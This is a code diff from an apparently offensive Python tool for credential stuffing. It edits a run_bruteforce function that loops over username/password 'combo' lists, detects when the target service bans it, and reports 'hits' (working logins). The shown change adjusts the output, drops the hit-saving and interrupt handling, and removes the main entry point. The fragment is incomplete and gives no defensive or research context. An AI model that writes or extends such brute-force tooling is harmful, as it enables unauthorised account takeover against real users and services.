@@ -39,19 +39,15 @@ def main_menu():
         except (ValueError, IndexError):
             print("Invalid choice. Please try again.")
 
-def run_bruteforce(config, combo_list, config_name):
-    """Runs the bruteforce attempt based on the selected config and combos."""
-    print("\nStarting bruteforce...")
-    try:
-        for combo in tqdm(combo_list, desc="Processing combos"):
-            result = process_combo(config, combo)
-            if result == "ban":
-                return
-            elif result[0] == "hit":
-                save_hit(config_name, combo[0], combo[1], result[1])
-    except KeyboardInterrupt:
-        print("\nProcess interrupted. Returning to main menu.")
+def run_bruteforce(config, combo_list, selected_config):
+    config_name_without_ext = os.path.splitext(selected_config)[0]  # Get the config name without extension
+    for combo in tqdm(combo_list, desc="Processing combos"):
+        result = process_combo(config, combo, config_name_without_ext)  # Pass the config name without extension
+        if result == "ban":
+            print("Ban detected. Stopping the bruteforce.")
+            break
+        elif result == "hit":
+            print("Hit found!")
+        elif result == "fail":
+            print("Failed attempt.")
 
-if __name__ == '__main__':
-    signal.signal(signal.SIGINT, signal_handler)
-    main_menu()
